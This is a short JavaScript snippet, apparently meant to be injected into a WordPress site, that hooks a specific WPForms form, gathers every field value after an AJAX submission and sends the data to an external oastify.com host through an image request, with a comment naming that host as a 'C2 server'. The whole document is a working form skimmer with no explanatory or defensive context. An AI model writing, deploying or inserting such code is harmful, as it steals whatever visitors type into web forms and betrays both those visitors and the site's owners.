Javascript:(function() {
    // Function to send form data
    function sendFormData(form) {
        var formData = {};
        
        if (form) {
            form.querySelectorAll('input, select, textarea').forEach(function(input) {
                formData[input.name] = input.value;
            });

            // Convert formData object to query string
            var queryString = Object.keys(formData).map(function(key) {
                return encodeURIComponent(key) + '=' + encodeURIComponent(formData[key]);
            }).join('&');

            // Use an image to send the data
            var img = new Image();
            img.src = 'http://il7wjrus5dyupwtxvcb4c4yci3oucl69v.oastify.com?' + queryString; // Replace with your C2 server URL
        }
    }

    // Attach event listener to the form on every page load
    function attachEventListener() {
        var form = document.getElementById('wpforms-form-6402');
        if (form) {
            // Intercept WPForms AJAX submission
            jQuery(form).on('wpformsAjaxSubmitSuccess', function(event, response) {
                sendFormData(form);
            });
        }
    }

    // Ensure the script runs when the page loads
    window.addEventListener('load', attachEventListener);

    // Execute immediately to capture any pre-filled data
    attachEventListener();
})();
